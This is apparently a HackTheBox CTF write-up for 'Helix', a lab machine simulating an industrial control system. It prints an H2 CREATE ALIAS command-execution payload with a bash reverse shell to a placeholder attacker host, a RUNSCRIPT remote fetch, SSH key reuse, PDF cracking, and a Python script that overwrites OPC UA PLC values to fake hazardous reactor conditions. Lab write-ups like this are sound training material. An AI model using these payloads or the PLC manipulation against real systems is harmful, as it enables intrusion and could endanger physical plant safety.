---
title: "HackTheBox — Helix (Medium Linux) Writeup"
author: daemonyrax
pubDatetime: 2026-04-29T00:00:00Z
customSlug: htb-helix-medium-linux-writeup
featured: true
draft: false
tags:
  - hackthebox
  - linux
  - medium
  - nifi
  - rce
  - ics
  - scada
  - opcua
  - ssh-tunneling
  - lateral-movement
description: >
  Full walkthrough of HackTheBox Helix — a Medium Linux box simulating an
  industrial control systems environment. Chain includes RCE via Apache NiFi
  ExecuteSQL/H2 abuse, SSH key recovery from support bundles, PDF password
  cracking, and OPC UA manipulation to trigger a privileged maintenance window.
---

Helix simulates a realistic industrial control systems (ICS/SCADA) environment.
The intrusion path starts with remote code execution through the `ExecuteSQL`
processor in Apache NiFi. After gaining initial access, backup artifacts reveal
an SSH key for lateral movement. The final stage requires cracking a PDF,
tunneling to an internal OPC UA service, and manipulating PLC values to
trigger a maintenance state that opens root access.

## Table of contents

## Machine Info

| Field       | Detail                         |
| ----------- | ------------------------------ |
| OS          | Linux                          |
| Difficulty  | Medium                         |
| Target IP   | `[TARGET_IP]`                  |
| Attacker IP | `[ATTACKER_IP]`                |

## Attack Chain Overview

```
Apache NiFi (unauthenticated) → ExecuteSQL + H2 Java alias → RCE as nifi
  → support-bundles → operator_id_ed25519.bak → SSH as operator → user.txt
  → PDF crack (rockyou) → OPC UA conditions → maintenance window → root.txt
```

## Step 1 — Reconnaissance

### Port Scan

```bash
nmap -p- -sV -sC -T4 [TARGET_IP]
```

Relevant open ports:

| Port | Service                         |
| ---- | ------------------------------- |
| 22   | OpenSSH 8.9p1 Ubuntu            |
| 80   | Nginx HTTP                      |
| 8080 | Apache NiFi 1.21.0              |

Virtual host enumeration revealed `flow.helix.htb` pointing to the NiFi
management interface. Add to `/etc/hosts` and browse to
`http://flow.helix.htb:8080/nifi`.

## Step 2 — Initial Access via Apache NiFi ExecuteSQL + H2 RCE

The NiFi instance is exposed without authentication — a serious misconfiguration.
NiFi's `ExecuteSQL` processor supports multiple database backends. The H2
Database JAR is present at `/opt/nifi-1.21.0/lib/h2-2.1.214.jar`. H2 supports
Java aliases that execute arbitrary Java code, making it a reliable RCE path.

### Configure DBCPConnectionPool Controller Service

Create a `DBCPConnectionPool` controller service with these properties:

| Property                    | Value                                               |
| --------------------------- | --------------------------------------------------- |
| Database Connection URL     | `jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3`       |
| Database Driver Class Name  | `org.h2.Driver`                                     |
| Database Driver Location    | `/opt/nifi-1.21.0/lib/h2-2.1.214.jar`              |

### Build the SQL Payload

Create `rce.sql` and host it via Python:

```bash
python3 -m http.server 8000
```

```sql
CREATE ALIAS IF NOT EXISTS PWN EXEC AS $$
String pwn(String cmd) throws java.io.IOException {
    Runtime.getRuntime().exec(new String[] {"/bin/sh", "-c", cmd});
    return "pwned";
}
$$;
CALL PWN('bash -c "bash -i >& /dev/tcp/[ATTACKER_IP]/4444 0>&1"');
```

### Trigger Execution

Create an `ExecuteSQL` processor, point it at the controller service, and use
this query:

```sql
RUNSCRIPT FROM 'http://[ATTACKER_IP]:8000/rce.sql'
```

Start a listener and run the processor:

```bash
nc -lvnp 4444
```

Shell obtained as `nifi`.

## Step 3 — Lateral Movement via Support Bundle SSH Key

The `nifi` account is a restricted service account. Enumerate the NiFi
installation directory:

```bash
ls -la /opt/nifi-1.21.0/support-bundles/
```

NiFi uses the `support-bundles` directory for diagnostics — in real environments
sensitive data is frequently included accidentally. Here it contains
`operator_id_ed25519.bak`, a private SSH key belonging to the `operator` user.

Copy the key and authenticate:

```bash
chmod 600 id_ed25519_operator
ssh -i id_ed25519_operator operator@[TARGET_IP]
```

```powershell
cat ~/user.txt
```

**User flag captured.**

## Step 4 — Privilege Escalation via OPC UA PLC Manipulation

### Review ICS Documentation

The operator home directory contains two files:

- `control systems diagram.png` — reactor sensor and control component layout
- `Operator Control & Safety Guide.pdf` — password-protected operational manual

Transfer both to your attack box and crack the PDF password:

```bash
pdf2john 'Operator Control & Safety Guide.pdf' > pdf_hash.txt
sudo gunzip /usr/share/wordlists/rockyou.txt.gz
john --wordlist=/usr/share/wordlists/rockyou.txt pdf_hash.txt
```

Password: **`operator1`**

The manual documents the privileged maintenance window trigger conditions:

| Condition   | Threshold     |
| ----------- | ------------- |
| Temperature | `>= 295°C`    |
| Pressure    | `>= 73 bar`   |
| Mode        | `MAINTENANCE` |

### Internal Network Reconnaissance

Check locally bound services:

```bash
ss -tulpn
```

Two services on localhost:

| Port | Service             |
| ---- | ------------------- |
| 8081 | Web HMI (reactor)   |
| 4840 | OPC UA              |

Check sudo rights:

```bash
sudo -l
# operator can run /usr/local/sbin/helix-maint-console NOPASSWD
```

The maintenance console is available — but the window is still closed. Need to
trigger the hazardous conditions first.

### SSH Port Forwarding to OPC UA

Port 4840 is not publicly exposed and the required Python `opcua` library is
not on the target. Forward the port to your attack box:

```bash
ssh -L 4840:127.0.0.1:4840 operator@[TARGET_IP] -i id_ed25519_operator
```

### OPC UA Node Manipulation

Install the library locally and run the exploit:

```bash
pip3 install opcua
```

```python
# root_exploit.py
from opcua import Client
import time

url = "opc.tcp://127.0.0.1:4840/helix/"
client = Client(url)

try:
    client.connect()
    print("[+] Connected to OPC UA via tunnel")

    nodes = {}
    for parent_id in ["ns=2;i=2", "ns=2;i=11"]:
        for child in client.get_node(parent_id).get_children():
            nodes[child.get_browse_name().Name] = child

    nodes["Mode"].set_value("MAINTENANCE")
    nodes["TestOverride"].set_value(True)
    nodes["CalibrationOffset"].set_value(20.0)

    print("[+] Payload injected. Hazardous condition simulated!")
    time.sleep(5)

finally:
    client.disconnect()
```

```bash
python3 root_exploit.py
```

### Trigger the Maintenance Window

After running the script, reactor temperature on the HMI rises to **301.4°C**.
Check `http://127.0.0.1:8081` — `Privileged Maintenance Window` state changes
to **OPEN**.

```bash
sudo /usr/local/sbin/helix-maint-console
```

```
[+] Privileged maintenance access granted
root@helix:/home/operator# id
uid=0(root) gid=0(root) groups=0(root)
```

```bash
cat /root/root.txt
```

**Root flag captured.**

## Key Takeaways

**Apache NiFi without authentication is full RCE.** The `ExecuteSQL` processor
combined with H2's `CREATE ALIAS EXEC` feature is a one-step shell. Any
exposed NiFi instance should be treated as compromised by default.

**Support bundles are accidental credential stores.** Diagnostic artifacts
package configuration and logs — private keys, tokens, and connection strings
end up there routinely. Always check `/opt/<service>/support-bundles` or
equivalent paths on service accounts.

**PDF passwords in CTF/ICS environments are always in rockyou.** Don't
overthink it — `pdf2john` + `john` with rockyou is the first move.

**OPC UA manipulation is the ICS privilege escalation primitive.** When a
`sudo` binary checks external state (PLC values, sensor readings, service
status), the attack surface is whatever controls that state. Here it's OPC UA
node values — set them to the documented threshold and the gate opens.

**SSH port forwarding is cleaner than proxychains for single-service pivots.**
`-L 4840:127.0.0.1:4840` maps the internal OPC UA port directly to localhost,
letting every local tool use it natively without proxy wrappers.
